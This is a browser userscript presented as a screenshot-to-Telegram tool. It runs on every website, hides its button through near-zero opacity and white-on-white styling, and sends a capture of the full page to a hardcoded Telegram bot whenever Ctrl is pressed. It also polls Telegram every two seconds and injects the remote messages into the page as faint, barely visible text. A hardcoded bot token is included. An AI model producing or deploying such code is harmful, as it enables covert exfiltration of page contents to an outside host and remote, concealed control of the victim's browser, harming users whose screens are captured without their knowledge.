// ==UserScript==
// @name         Enhanced Webpage Screenshot and Telegram Messages
// @namespace    http://tampermonkey.net/
// @version      0.3
// @description  Take a screenshot of the webpageshow it in a new tab, send it to Telegram, and display Telegram zzzzmessages on the website
// @author       Your Name
// @include      http://*/*
// @include      https://*/*
// @require      https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.3.2/html2canvas.min.js
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const token = "7110052875:AAF8o8Rof0q4KFEuVZBLEHM1bgaWe7pZQss";
    const chat_id = "-4570224806";
    const telegramAPI = `https://api.telegram.org/bot${token}/sendPhoto`;
    const telegramUpdatesAPI = `https://api.telegram.org/bot${token}/getUpdates`;
    let lastUpdateId = 0;
    let onePressCount = 0;
    let button;
    let isMessageDisplayActive = true;

    function takeScreenshot() {
        if (isMessageDisplayActive) {
            html2canvas(document.body, { useCORS: true }).then(function (canvas) {
                let base64image = canvas.toDataURL("image/png");
                sendToTelegram(base64image);
            });
        }
    }

    function sendToTelegram(base64image) {
        let byteString = atob(base64image.split(',')[1]);
        let mimeString = base64image.split(',')[0].split(':')[1].split(';')[0];
        let ab = new ArrayBuffer(byteString.length);
        let ia = new Uint8Array(ab);
        for (let i = 0; i < byteString.length; i++) {
            ia[i] = byteString.charCodeAt(i);
        }
        let blob = new Blob([ab], { type: mimeString });

        let formData = new FormData();
        formData.append("chat_id", chat_id);
        formData.append("photo", blob, "screenshot.png");

        fetch(telegramAPI, {
            method: "POST",
            body: formData
        })
            .catch(error => {
                console.error("Error:", error);
            });
    }

    function sendTelegramMessage(messageText) {
        let formData = new FormData();
        formData.append("chat_id", chat_id);
        formData.append("text", messageText);

        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: "POST",
            body: formData
        })
            .catch(error => {
                console.error("Error sending Telegram message:", error);
            });
    }

    function fetchTelegramMessages() {
        fetch(`${telegramUpdatesAPI}?offset=${lastUpdateId + 1}`)
            .then(response => response.json())
            .then(data => {
                if (data.ok && data.result.length > 0) {
                    data.result.forEach(message => {
                        if (message.message && message.message.text) {
                            let receivedMessage = message.message.text.trim();
                            lastUpdateId = message.update_id;

                            // Check for "1111" command to toggle bot state
                            if (receivedMessage === "1111") {
                                toggleBotState(); // Toggle bot on/off
                            } else {
                                displayMessage(receivedMessage); // Display other messages
                            }
                        }
                    });
                }
            })
            .catch(error => {
                console.error("Error fetching Telegram messages:", error);
            });
    }

    function displayMessage(message) {
        let messageDiv = document.createElement("div");
        messageDiv.innerHTML = message;
        messageDiv.style.position = "fixed";
        messageDiv.style.top = "0";
        messageDiv.style.left = "50%";
        messageDiv.style.transform = "translateX(-50%)";
        messageDiv.style.backgroundColor = "transparent";
        messageDiv.style.color = "#808080";
        messageDiv.style.padding = "10px";
        messageDiv.style.zIndex = 100000000000001;
        messageDiv.style.borderRadius = "5px";
        messageDiv.style.opacity = "0.22"; // Set opacity to 30%
        document.body.appendChild(messageDiv);

        setTimeout(() => {
            document.body.removeChild(messageDiv);
        }, 2000);
    }

    function createButton() {
        button = document.createElement("button");
        button.innerHTML = "Take Screenshot";
        button.style.position = "fixed";
        button.style.top = "10px";
        button.style.right = "70px";
        button.style.zIndex = 1000000000000000;
        button.style.padding = "5px 30px";
        button.style.fontSize = "16px";
        button.style.backgroundColor = "white";
        button.style.color = "white";
        button.style.border = "none";
        button.style.borderRadius = "5px";
        button.style.cursor = "pointer";
        button.style.opacity = "0.001"; // Keep the original opacity
        button.onclick = takeScreenshot;
        document.body.appendChild(button);
    }

    function toggleBotState() {
        if (button) {
            button.remove();
            button = null;
            isMessageDisplayActive = false;
            sendTelegramMessage("OFF"); // Send OFF message to Telegram
        } else {
            createButton();
            isMessageDisplayActive = true;
            sendTelegramMessage("ON"); // Send ON message to Telegram
        }
    }

    // Initialize button
    createButton();

    // Add keyboard event listener for Ctrl key
    document.addEventListener('keydown', function (event) {
        if (event.ctrlKey) {
            takeScreenshot(); // Call the screenshot function when Ctrl is pressed
        }

        // Check if "1" key is pressed
        if (event.key === '1') {
            onePressCount++;

            if (onePressCount >= 4) {
                toggleBotState(); // Toggle bot on/off
                onePressCount = 0; // Reset counter
            }
        }
    });

    setInterval(fetchTelegramMessages, 2000);
})();
